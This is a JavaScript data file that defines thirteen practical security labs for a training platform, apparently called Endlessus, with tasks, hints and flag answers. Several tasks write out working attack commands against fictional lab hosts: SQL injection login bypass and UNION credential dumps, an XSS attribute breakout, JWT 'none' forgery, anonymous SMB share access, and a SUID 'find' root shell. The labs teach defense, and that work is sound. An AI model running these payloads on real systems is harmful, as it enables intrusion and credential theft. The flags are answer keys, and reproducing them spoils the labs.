// curriculum/practical-labs.js
// Canonical Endlessus Practical Labs Dataset (13 Authoritative Practical Labs)
module.exports = [
  {
    id: "lab-headers",
    num: "01",
    title: "Practical HTTP Security Headers Lab",
    tagline: "CSP Evaluation & Response Header Hardening",
    difficulty: "Beginner",
    difficultyBadge: "🟢 Beginner",
    category: "Foundations",
    estimatedTime: "20 min",
    foundationalRoomId: "room-30",
    description: "Audit a live staging web server's HTTP response headers. Catalog missing defense-in-depth headers, detect lack of HSTS and Framing protections, inspect sensitive cookies, and verify a hardened Nginx configuration template.",
    flag: "flag{strict_transport_security_csp}",
    tasks: [
      { id: "t1", title: "Query Web Server Response Headers", instruction: "Run 'curl -I https://staging.acmefin.local' to audit raw response headers." },
      { id: "t2", title: "Check for Strict-Transport-Security (HSTS)", instruction: "Filter response headers with 'curl -I https://staging.acmefin.local | grep -i strict'." },
      { id: "t3", title: "Audit Clickjacking Defenses", instruction: "Inspect framing controls using 'curl -I https://staging.acmefin.local | grep -i frame'." },
      { id: "t4", title: "Audit Sensitive Session Cookie Flags", instruction: "Audit cookies: 'curl -I https://staging.acmefin.local | grep -i set-cookie'." },
      { id: "t5", title: "Retrieve Compliance Flag & Review Hardened Config", instruction: "Inspect hardened configuration template using 'cat /etc/nginx/conf.d/security.conf'." }
    ],
    hints: [
      "Concept: HTTP security headers instruct browser clients to enforce defensive security controls.",
      "Direction: Use curl -I to fetch HTTP response headers without downloading the full body.",
      "Tool: curl and grep.",
      "Syntax: curl -I https://staging.acmefin.local | grep -i server",
      "Explanation: Proper headers prevent clickjacking, MIME sniffing, and downgrade attacks."
    ]
  },
  {
    id: "lab-permissions",
    num: "02",
    title: "Practical Linux Permissions & Octal Masking Lab",
    tagline: "Octal Modes, Least Privilege & Credential Protection",
    difficulty: "Beginner",
    difficultyBadge: "🟢 Beginner",
    category: "Foundations",
    estimatedTime: "20 min",
    foundationalRoomId: "room-05",
    description: "Audit a live Linux web root filesystem. Locate a dangerously world-writable database configuration file (0777), extract plaintext credentials, and apply the principle of least privilege using chmod 600.",
    flag: "flag{chmod_600_config_rw}",
    tasks: [
      { id: "t1", title: "Audit File Permissions in Current Directory", instruction: "Run 'ls -la' to inspect full permission bits across all directory contents." },
      { id: "t2", title: "Identify the World-Writable File", instruction: "Inspect config.php specifically: 'ls -la config.php' or 'stat config.php'." },
      { id: "t3", title: "Inspect Database Credentials in config.php", instruction: "Read file contents with 'cat config.php'." },
      { id: "t4", title: "Apply Principle of Least Privilege with chmod", instruction: "Enforce least privilege using 'chmod 600 config.php'." },
      { id: "t5", title: "Verify Permissions and Retrieve Flag", instruction: "Verify hardened permissions: 'stat -c \"%a %n\" config.php'." }
    ],
    hints: [
      "Concept: Linux file permissions control read (4), write (2), and execute (1) access for owner, group, and others.",
      "Direction: 777 allows any user on the system to overwrite sensitive files.",
      "Tool: ls, chmod, and stat.",
      "Syntax: chmod 600 config.php",
      "Explanation: Mode 600 grants read/write to the owner only (-rw-------)."
    ]
  },
  {
    id: "lab-auth",
    num: "03",
    title: "Practical Authentication & Rate Limiting Bypass Lab",
    tagline: "SQLi Login Bypass & Throttling Defense",
    difficulty: "Beginner",
    difficultyBadge: "🟢 Beginner",
    category: "Foundations",
    estimatedTime: "20 min",
    foundationalRoomId: "room-29",
    description: "Audit an unthrottled Node.js Express authentication API. Analyze source code to isolate SQL string concatenation, craft an authentication bypass payload with curl, and audit rate limiting headers.",
    flag: "flag{rate_limit_429_bcrypt}",
    tasks: [
      { id: "t1", title: "Review Authentication Backend Source Code", instruction: "Inspect server code with 'cat /app/server.js' or 'cat server.js'." },
      { id: "t2", title: "Identify the SQL Injection Flaw in the Login Query", instruction: "Filter query line: 'cat /app/server.js | grep -i select'." },
      { id: "t3", title: "Send the Authentication Bypass Request", instruction: "Send bypass: curl -X POST -H \"Content-Type: application/json\" -d '{\"username\":\"admin\\'--\",\"password\":\"x\"}' http://10.10.10.45/login" },
      { id: "t4", title: "Understand Rate Limiting and HTTP 429", instruction: "Check endpoint headers: 'curl -I http://10.10.10.45/login'." },
      { id: "t5", title: "Submit the Auth Bypass Flag", instruction: "Submit flag token: flag{rate_limit_429_bcrypt}." }
    ],
    hints: [
      "Concept: Authentication validates identity. Missing rate limits permit automated attacks, while unescaped SQL breaks query logic.",
      "Direction: Single quote closes the SQL literal; comment dashes ignore password validation.",
      "Tool: curl -X POST.",
      "Syntax: curl -X POST -d '{\"username\":\"admin\\'--\",\"password\":\"x\"}' http://10.10.10.45/login",
      "Explanation: HTTP 429 Too Many Requests defends endpoints against brute-force guessing."
    ]
  },
  {
    id: "lab-idor",
    num: "04",
    title: "Practical Insecure Direct Object References (IDOR) Lab",
    tagline: "Horizontal Privilege Escalation & Parameter Tampering",
    difficulty: "Beginner",
    difficultyBadge: "🟢 Beginner",
    category: "Foundations",
    estimatedTime: "20 min",
    foundationalRoomId: "room-27",
    description: "Audit a RESTful billing API endpoint. Observe how predictable numeric invoice identifiers permit horizontal access control violations and extract a confidential corporate acquisition invoice.",
    flag: "flag{server_side_authz_session_token}",
    tasks: [
      { id: "t1", title: "Fetch Your Assigned Invoice via API", instruction: "Fetch own invoice: 'curl http://billing.internal.local/api/v1/invoices/9482'." },
      { id: "t2", title: "Test Parameter Tampering on Adjacent Invoices", instruction: "Test adjacent ID: 'curl http://billing.internal.local/api/v1/invoices/9481'." },
      { id: "t3", title: "Enumerate the Confidential Acquisition Invoice", instruction: "Query executive invoice: 'curl http://billing.internal.local/api/v1/invoices/10043'." },
      { id: "t4", title: "Extract the Authorization Flag", instruction: "Extract flag token: 'curl http://billing.internal.local/api/v1/invoices/10043 | grep flag'." }
    ],
    hints: [
      "Concept: IDOR occurs when applications use user-supplied input to access objects directly without server-side authorization checks.",
      "Direction: Change the invoice ID in the URL to access other records.",
      "Tool: curl.",
      "Syntax: curl http://billing.internal.local/api/v1/invoices/10043",
      "Explanation: Verify authorization against the user session on every request, never trusting client parameters."
    ]
  },
  {
    id: "lab-sqli",
    num: "05",
    title: "Practical UNION-Based SQL Injection Lab",
    tagline: "Database Enumeration & Credential Extraction",
    difficulty: "Intermediate",
    difficultyBadge: "🟣 Intermediate",
    category: "Web Security",
    estimatedTime: "25 min",
    foundationalRoomId: "room-25",
    description: "Target a vulnerable product search catalog. Break string delimiters with single quotes, determine column count using ORDER BY, and project database versions and admin password hashes via UNION SELECT.",
    flag: "flag{parameterized_queries_prepared_statement}",
    tasks: [
      { id: "t1", title: "Probe for SQL Injection with a Single Quote", instruction: "Trigger syntax error: curl \"http://shop.local/search?item=shirt'\"" },
      { id: "t2", title: "Determine Column Count with ORDER BY", instruction: "Determine columns: curl \"http://shop.local/search?item=' ORDER BY 4-- -\"" },
      { id: "t3", title: "Extract Database Version via UNION SELECT", instruction: "Extract version: curl \"http://shop.local/search?item=' UNION SELECT 1,sqlite_version(),3,4-- -\"" },
      { id: "t4", title: "Dump Administrator Credentials from Users Table", instruction: "Dump credentials: curl \"http://shop.local/search?item=' UNION SELECT 1,username,password_hash,4 FROM users-- -\"" },
      { id: "t5", title: "Submit the Remediation Flag", instruction: "Submit flag token: flag{parameterized_queries_prepared_statement}." }
    ],
    hints: [
      "Concept: UNION combines rows from the original query with an injected secondary query.",
      "Direction: Number of columns and data types in UNION queries must match the original query.",
      "Tool: curl or sqlmap.",
      "Syntax: ' UNION SELECT 1,username,password_hash,4 FROM users-- -",
      "Explanation: Parameterized queries and prepared statements completely neutralize SQL injection."
    ]
  },
  {
    id: "lab-xss",
    num: "06",
    title: "Practical Reflected XSS & Context Escaping Lab",
    tagline: "HTML Attribute Breakout & DOM Event Injection",
    difficulty: "Intermediate",
    difficultyBadge: "🟣 Intermediate",
    category: "Web Security",
    estimatedTime: "25 min",
    foundationalRoomId: "room-26",
    description: "Exploit user reflection inside an HTML input attribute context. Probe reflection, break out of quotes without needing script tags, and execute JavaScript via HTML5 autofocus and onfocus event handlers.",
    flag: "flag{context_aware_output_encoding_csp}",
    tasks: [
      { id: "t1", title: "Probe for Unescaped Reflection", instruction: "Send probe: curl \"http://portal.local/search?q=test<probe>\"" },
      { id: "t2", title: "Identify the HTML Injection Context", instruction: "Inspect parent tag: 'curl \"http://portal.local/search?q=mysearch\" | grep -i input'" },
      { id: "t3", title: "Break Out of the Attribute Using Double Quotes", instruction: "Break out with quotes: curl \"http://portal.local/search?q=test\\\"+autofocus\"" },
      { id: "t4", title: "Inject Event Handler and Retrieve Flag", instruction: "Trigger XSS: curl \"http://portal.local/search?q=test\\\"+autofocus+onfocus=\\\"alert(document.domain)\\\"+x=\\\"\"" }
    ],
    hints: [
      "Concept: XSS executes malicious JavaScript inside the victim's browser session.",
      "Direction: When reflected inside an HTML attribute value, close the quote with \" to define new attributes.",
      "Tool: curl and grep.",
      "Syntax: test\"+autofocus+onfocus=\"alert(1)\"+x=\"",
      "Explanation: Context-aware HTML entity encoding prevents attribute breakouts."
    ]
  },
  {
    id: "lab-csrf",
    num: "07",
    title: "Practical Cross-Site Request Forgery (CSRF) Lab",
    tagline: "Ambient Cookie Exploitation & SameSite Defense",
    difficulty: "Intermediate",
    difficultyBadge: "🟣 Intermediate",
    category: "Web Security",
    estimatedTime: "25 min",
    foundationalRoomId: "room-28",
    description: "Audit an internal banking fund transfer service. Review state-changing POST endpoints, detect missing SameSite cookie attributes, examine an attacker PoC exploit form, and enforce anti-CSRF defenses.",
    flag: "flag{samesite_strict_anti_csrf_token}",
    tasks: [
      { id: "t1", title: "Analyze the State-Changing Fund Transfer Endpoint", instruction: "Test transfer endpoint: curl -X POST -d \"to_account=12345&amount=100\" http://bank.local/transfer" },
      { id: "t2", title: "Inspect Session Cookie SameSite Configuration", instruction: "Audit cookie: curl -I http://bank.local/login | grep -i cookie" },
      { id: "t3", title: "Review Third-Party Auto-Submitting PoC Form", instruction: "Inspect exploit form: cat /var/www/attacker/poc_form.html" },
      { id: "t4", title: "Verify Defenses and Retrieve Compliance Token", instruction: "Retrieve flag token: flag{samesite_strict_anti_csrf_token}." }
    ],
    hints: [
      "Concept: Browsers automatically attach cookies to cross-origin requests unless restricted by SameSite attributes.",
      "Direction: Check if the session cookie includes SameSite=Strict or SameSite=Lax.",
      "Tool: curl and cat.",
      "Syntax: curl -I http://bank.local/login | grep -i cookie",
      "Explanation: Synchronizer anti-CSRF tokens and SameSite=Strict cookies prevent unauthorized request forgery."
    ]
  },
  {
    id: "lab-network",
    num: "08",
    title: "Practical Network Service & SMB Enumeration Lab",
    tagline: "Nmap Stealth Scans, Netcat Banners & Samba Shares",
    difficulty: "Intermediate",
    difficultyBadge: "🟣 Intermediate",
    category: "Network Security",
    estimatedTime: "30 min",
    foundationalRoomId: "room-20",
    description: "Scan an exposed enterprise server (10.10.20.15). Conduct SYN stealth scans, fingerprint FTP daemons with netcat banner grabbing, enumerate Samba network shares with smbclient, and download confidential files.",
    flag: "flag{closed_filtered_port_21_backdoor}",
    tasks: [
      { id: "t1", title: "Perform TCP SYN Stealth Scan on Target Host", instruction: "Scan host: 'nmap -sS -sV 10.10.20.15'." },
      { id: "t2", title: "Isolate FTP Service Version on Port 21", instruction: "Scan FTP port: 'nmap -sV -p 21 10.10.20.15'." },
      { id: "t3", title: "Grab Raw Service Banner Using Netcat", instruction: "Grab banner: 'nc -vn 10.10.20.15 21'." },
      { id: "t4", title: "Enumerate Samba File Shares with smbclient", instruction: "List shares: 'smbclient -L //10.10.20.15 -N'." },
      { id: "t5", title: "Download Remote Flag from Public Share", instruction: "Connect & get flag: 'smbclient //10.10.20.15/public -N -c \"get flag.txt\"' then 'cat flag.txt'." }
    ],
    hints: [
      "Concept: Port scanning discovers active listening services; banner grabbing extracts exact software versions.",
      "Direction: Use smbclient -L with -N for anonymous null sessions.",
      "Tool: nmap, nc, and smbclient.",
      "Syntax: smbclient //10.10.20.15/public -N -c \"get flag.txt\"",
      "Explanation: Restrict SMB access and disable anonymous guest access on internal shares."
    ]
  },
  {
    id: "lab-logs",
    num: "09",
    title: "Practical Security Incident Log Analysis Lab",
    tagline: "SOC Forensics, Path Traversal & Web Shell Detection",
    difficulty: "Intermediate",
    difficultyBadge: "🟣 Intermediate",
    category: "Network Security",
    estimatedTime: "25 min",
    foundationalRoomId: "room-09",
    description: "Investigate a web server breach as a SOC analyst. Parse Apache access logs and SSH auth logs, isolate path traversal attempts, identify an uploaded PHP web shell, and determine the brute-force attacker IP.",
    flag: "flag{grep_log_analysis_incident_response_2026}",
    tasks: [
      { id: "t1", title: "Review Web Server Access Log Structure", instruction: "Inspect initial log lines: 'cat access.log | head -n 2' or 'head -n 5 access.log'." },
      { id: "t2", title: "Isolate Directory Traversal Attacks in Access Logs", instruction: "Filter path traversal: 'grep -E \"\\.\\./\" access.log' or 'grep \"..\" access.log'." },
      { id: "t3", title: "Identify Uploaded Malicious Web Shell Execution", instruction: "Locate shell execution: 'grep \"uploads\" access.log' or 'grep \"cmd.php\" access.log'." },
      { id: "t4", title: "Investigate SSH Brute-Force Attacks in auth.log", instruction: "Filter failed SSH: 'grep \"Failed password\" auth.log'." },
      { id: "t5", title: "Compile Findings and Submit Incident Response Flag", instruction: "Read incident summary: 'cat incident_summary.txt'." }
    ],
    hints: [
      "Concept: Security logs capture timestamps, client IPs, HTTP methods, status codes, and URI paths for forensic analysis.",
      "Direction: Look for .. directory traversal and cmd.php in access.log.",
      "Tool: grep, head, and cat.",
      "Syntax: grep \"Failed password\" auth.log",
      "Explanation: Centralized SIEM log aggregation allows rapid triage of coordinated attacks."
    ]
  },
  {
    id: "lab-suid",
    num: "10",
    title: "Practical Linux SUID Privilege Escalation Lab",
    tagline: "GTFOBins Exploitation & Elevated Root Shell Breakout",
    difficulty: "Intermediate",
    difficultyBadge: "🟣 Intermediate",
    category: "Linux Security",
    estimatedTime: "25 min",
    foundationalRoomId: "room-31",
    description: "Escalate from unprivileged guest (UID 1001) to root (UID 0). Enumerate non-standard SUID binaries, discover an elevated /usr/bin/find binary, and execute GTFOBins breakout to read the restricted /root/flag.txt.",
    flag: "flag{suid_find_exec_root_privesc}",
    tasks: [
      { id: "t1", title: "Verify Current User and Security Boundary", instruction: "Check identity: 'whoami' and 'id'." },
      { id: "t2", title: "Enumerate SUID Binaries with find", instruction: "Enumerate SUID: 'find / -perm -4000 -type f 2>/dev/null'." },
      { id: "t3", title: "Inspect File Permissions of SUID find Binary", instruction: "Inspect SUID binary: 'ls -l /usr/bin/find'." },
      { id: "t4", title: "Execute SUID Shell Breakout via GTFOBins", instruction: "Spawn root shell: 'find . -exec /bin/sh -p \\; -quit'." },
      { id: "t5", title: "Capture Root Flag with Elevated Privileges", instruction: "Read root flag: 'cat /root/flag.txt'." }
    ],
    hints: [
      "Concept: SUID allows executable files to run with the permissions of the file owner (root).",
      "Direction: Use GTFOBins find -exec /bin/sh -p to maintain effective UID 0.",
      "Tool: find, ls -l, and whoami.",
      "Syntax: find . -exec /bin/sh -p \\; -quit",
      "Explanation: Audit SUID bits regularly; never grant SUID to scripting or execution binaries."
    ]
  },
  {
    id: "lab-jwt",
    num: "11",
    title: "Practical JSON Web Token (JWT) Exploitation Lab",
    tagline: "Alg: None Attack, Payload Tampering & API Access",
    difficulty: "Intermediate",
    difficultyBadge: "🟣 Intermediate",
    category: "Modern Security",
    estimatedTime: "25 min",
    foundationalRoomId: "room-33",
    description: "Exploit an insecure JWT implementation. Decode guest tokens, tamper payload claims to elevate role to superadmin, craft an unsigned token using the 'none' algorithm flaw, and authenticate to /admin.",
    flag: "flag{none_algorithm_signature_verification}",
    tasks: [
      { id: "t1", title: "Inspect Assigned Guest JWT Token", instruction: "Inspect token: 'cat token.txt'." },
      { id: "t2", title: "Base64-Decode JWT Payload to Reveal Claims", instruction: "Decode token payload: echo '<payload>' | base64 -d" },
      { id: "t3", title: "Encode Forged 'none' Algorithm Header", instruction: "Encode header: echo -n '{\"alg\":\"none\",\"typ\":\"JWT\"}' | base64" },
      { id: "t4", title: "Execute Token Forgery Script", instruction: "Forge admin token: 'python3 forge_jwt.py'." },
      { id: "t5", title: "Transmit Forged Token to Admin Endpoint", instruction: "Query admin API: curl -H \"Authorization: Bearer <forged_token>\" http://auth.api.local/admin" }
    ],
    hints: [
      "Concept: JWT consists of header, payload, and cryptographic signature separated by dots.",
      "Direction: Setting alg: none tells vulnerable libraries to skip signature verification.",
      "Tool: base64, python3, and curl.",
      "Syntax: curl -H \"Authorization: Bearer <token>\" http://auth.api.local/admin",
      "Explanation: Hardcode accepted signing algorithms on the backend and reject 'none' unconditionally."
    ]
  },
  {
    id: "lab-crypto",
    num: "12",
    title: "Practical XOR & Frequency Analysis Decryption Lab",
    tagline: "Single-Byte XOR Keyspace Exhaustion & English Scoring",
    difficulty: "Intermediate",
    difficultyBadge: "🟣 Intermediate",
    category: "Modern Security",
    estimatedTime: "25 min",
    foundationalRoomId: "room-34",
    description: "Break custom XOR obfuscation on intercepted hex communications. Analyze the 256-key keyspace, score candidates using English character frequencies (ETAOIN SHRDLU), and recover the plaintext communication.",
    flag: "flag{aes_gcm_authenticated_encryption}",
    tasks: [
      { id: "t1", title: "Inspect Intercepted Hexadecimal Ciphertext", instruction: "Read ciphertext: 'cat ciphertext.hex'." },
      { id: "t2", title: "Calculate the Total Single-Byte XOR Keyspace", instruction: "Calculate keyspace: python3 -c \"print(2**8)\"." },
      { id: "t3", title: "Review English Character Frequency Distribution", instruction: "Print frequency weights: python3 -c \"print('ETAOIN SHRDLU')\"." },
      { id: "t4", title: "Execute Frequency-Scoring Decryption Solver", instruction: "Run statistical solver: 'python3 solve.py'." },
      { id: "t5", title: "Verify Decrypted Plaintext and Retrieve Flag", instruction: "Read decrypted flag: 'cat decrypted.txt'." }
    ],
    hints: [
      "Concept: Single-byte XOR preserves underlying frequency characteristics of plaintext.",
      "Direction: Exhaust the 256 keys (0x00–0xFF) and score the plaintext against English letter frequencies.",
      "Tool: python3 and cat.",
      "Syntax: python3 solve.py",
      "Explanation: Never use home-grown XOR obfuscation; mandate AES-GCM or ChaCha20-Poly1305."
    ]
  },
  {
    id: "lab-capstone",
    num: "13",
    title: "Capstone Pentest: Final Enterprise Target",
    tagline: "End-to-End Penetration Test Engagement",
    difficulty: "Advanced",
    difficultyBadge: "🔴 Advanced",
    category: "Junior Pentester",
    estimatedTime: "60 min",
    foundationalRoomId: "room-40",
    description: "A complete multi-stage penetration testing engagement against an isolated enterprise target (10.10.10.100). Synthesize reconnaissance, web fuzzing, SQL injection exploitation, initial shell access, local enumeration, SUID privilege escalation, and executive reporting.",
    flag: "flag{endlessus_capstone_certified_junior_pentester_2026}",
    tasks: [
      { id: "t1", title: "Phase 1: Recon & Nmap Scan", instruction: "Scan 10.10.10.100 to discover open ports (22, 80): 'nmap -sV -p 22,80 10.10.10.100'." },
      { id: "t2", title: "Phase 2: Directory Fuzzing", instruction: "Fuzz endpoints to discover hidden administrative login: 'curl http://10.10.10.100/api/v2/auth'." },
      { id: "t3", title: "Phase 3: SQLi Exploitation", instruction: "Exploit SQL injection in login to extract API access token: 'curl -X POST -d \"user=admin\\'--&pass=x\" http://10.10.10.100/api/v2/auth'." },
      { id: "t4", title: "Phase 4: SSH Initial Foothold", instruction: "Connect to target shell as user cadet and retrieve user.txt: 'cat /home/cadet/user.txt'." },
      { id: "t5", title: "Phase 5: SUID Privilege Escalation", instruction: "Locate SUID /usr/bin/find and escalate privileges to root: 'find . -exec /bin/sh -p \\; -quit'." },
      { id: "t6", title: "Phase 6: Executive Reporting", instruction: "Capture root.txt and review the generated security remediation summary: 'cat /root/root.txt'." }
    ],
    hints: [
      "Concept: Full methodology synthesis across all 10 stages.",
      "Direction: Follow PTES: Recon -> Enum -> Exploit -> Foothold -> Privesc -> Report.",
      "Tool: nmap, curl, SUID find, and cat.",
      "Syntax: Step-by-step multi-stage execution.",
      "Explanation: Successful completion awards the Endlessus Junior Pentester Certificate badge."
    ]
  }
];
